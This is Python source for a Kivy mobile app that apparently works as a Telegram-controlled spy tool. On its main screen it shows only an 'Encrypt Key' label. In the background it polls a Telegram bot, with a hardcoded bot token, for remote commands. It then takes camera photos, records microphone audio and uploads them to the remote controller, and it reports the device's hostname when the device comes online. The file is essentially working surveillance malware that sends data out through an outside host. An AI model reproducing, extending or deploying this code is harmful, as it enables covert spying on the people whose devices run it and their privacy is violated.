from kivy.app import App
from kivy.clock import Clock
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout

import requests, time, threading, socket, random, platform, json, plyer

TOKEN = "8500905322:AAEufrxEYMoHmhmJ0X0Bo1OeeCpOo2fAzCU"
ADMIN_KEY = str(random.randint(1000,9999))
RUNNING_COUNT = 0
EXPIRY_ID = []
ADMIN = None

class MyApp(App):

    def build(self):
        self.label = Label(text=f"Encrypt Key: {ADMIN_KEY}")
        self.update_ui("Listening...", 10)
        layout = BoxLayout()
        layout.add_widget(self.label)
        threading.Thread(target=server,args=(self,),daemon=True).start()
        return layout

    def update_ui(self, text, sec=0):
        Clock.schedule_once(lambda dt: setattr(self.label, "text", text),sec)

def server(ui):
    global RUNNING_COUNT,ADMIN
    while True:
        if not check_internet()['result']:
            ui.update_ui(f"Waiting for Connection...")
            while not check_internet()['result']:
                time.sleep(1)
            if ADMIN:
                send_message({'chat_id': ADMIN, 'type': 'Message', 'data': f'`{platform.node()}` *Online*'})
            ui.update_ui(f"Internet Connected")

        update_res = get_update()
        if not update_res['result']:
            ui.update_ui(f"GetUpdate error {update_res['output']}")
            time.sleep(1)
            continue
        if not update_res['output']['ok']:
            ui.update_ui(f"GetData error {update_res['output']['description']}")
            time.sleep(1)
            continue
        if not update_res['output']['result']:
            ui.update_ui(f"NoCommands ({update_res['output']['result']})")
            RUNNING_COUNT += 1
            time.sleep(1)
            continue

        last_msg = update_res['output']['result'][-1]
        update_id = last_msg['update_id']
        chat_id = last_msg['message']['chat']['id']
        message = last_msg['message']['text']

        if RUNNING_COUNT == 0:
            ui.update_ui(f"Skipping Old Command ({message})")
            EXPIRY_ID.append(update_id)
            RUNNING_COUNT += 1
            time.sleep(1)
            continue

        if update_id in EXPIRY_ID:
            ui.update_ui(f"Listening...")
            RUNNING_COUNT += 1
            time.sleep(1)
            continue

        if not ADMIN:
            if len(message.split()) == 2 and message.split()[0].lower() == "login":
                if ADMIN_KEY == message.split()[1]:
                    send_message({'chat_id': chat_id, 'type': 'Message', 'data': '*Login Successfully.*'})
                    ADMIN = chat_id
                    ui.update_ui(f"User Login ({chat_id})")
                else:
                    send_message({'chat_id': chat_id, 'type': 'Message', 'data': '*Invalid Passowrd!*'})
                    ui.update_ui(f"User Login Failed ({chat_id})")
            else:
                ui.update_ui(f"Skipping Unknown Message ({message})")
            EXPIRY_ID.append(update_id)
            RUNNING_COUNT += 1
            time.sleep(1)
            continue

        process_response(message, chat_id)
        ui.update_ui(f"Message processed {time.strftime('%H:%M:%S')}")
        EXPIRY_ID.append(update_id)
        RUNNING_COUNT += 1
        time.sleep(1)
        continue

def check_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return {'result': True}
    except Exception as error:
        return {'result': False, 'output': error}

def get_update():
    try:
        res = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates", timeout=5)
        if res.status_code != 200:
            return {'result': False, 'output': f'status code {res.status_code}'}
        return {'result': True, 'output': res.json()}
    except Exception as error:
        return {'result': False, 'output': error}

def send_message(data):
    try:
        chid = data['chat_id']
        send_type = data['type']
        send_data = data['data']

        if send_type == "Message":
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            payload = {'chat_id': chid, 'text': send_data, 'parse_mode':'Markdown'}
            res = requests.post(url, data=payload)

        elif send_type in ["Photo", "Audio", "Video", "Document"]:
            url = f"https://api.telegram.org/bot{TOKEN}/send{send_type}"
            # Proper files format
            file_key = send_type.lower()  # 'photo', 'audio', etc
            if isinstance(send_data, bytes):
                files = {file_key: ('file', send_data)}
            else:
                files = {file_key: send_data}  # fallback
            res = requests.post(url, files=files, data={'chat_id': chid})

        else:
            return {'result': False, 'output': f'Invalid send type ({send_type})'}

        if res.status_code != 200:
            return {'result': False, 'output': res.status_code}

        return {'result': True, 'output': res.status_code}

    except Exception as error:
        return {'result': False, 'output': error}

def get_system_info():
    data = {
        "os": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "platform": platform.platform(),
        "node_name": platform.node()
    }
    return json.dumps(data, indent=2)

def process_response(message, chat_id):
    parts = message.strip().split()
    main = parts[0].lower()

    if main == "photo":
        def after_photo(path):
            try:
                with open(path, "rb") as f:
                    data = f.read()
                send_message({'chat_id': chat_id, 'type': 'Photo', 'data': data})
            except Exception as error:
                send_message({'chat_id': chat_id, 'type': 'Message', 'data': f'*Photo Error:* `{error}`'})
        plyer.camera.take_picture(f"{random.randint(10000,99999)}.jpg", after_photo)
        send_message({'chat_id': chat_id, 'type': 'Message', 'data': '*Taking photo...*'})

    elif main == "record":
        if len(parts) != 2:
            send_message({'chat_id': chat_id, 'type': 'Message', 'data': '*Use:* `record <seconds>`'})
            return
        try:
            sec = int(parts[1])
        except:
            send_message({'chat_id': chat_id, 'type': 'Message', 'data': '*Invalid seconds!*'})
            return

        def record_audio():
            try:
                send_message({'chat_id': chat_id, 'type': 'Message', 'data': f'*Recording {sec}s...*'})
                plyer.audio.start()
                time.sleep(sec)
                path = plyer.audio.stop()
                with open(path, "rb") as f:
                    data = f.read()
                send_message({'chat_id': chat_id, 'type': 'Audio', 'data': data})
            except Exception as error:
                send_message({'chat_id': chat_id, 'type': 'Message', 'data': f'*Audio Error:* `{error}`'})

        threading.Thread(target=record_audio, daemon=True).start()

    else:
        send_message({'chat_id': chat_id, 'type': 'Message', 'data': f'*Invalid Option* ({message})'})

MyApp().run()
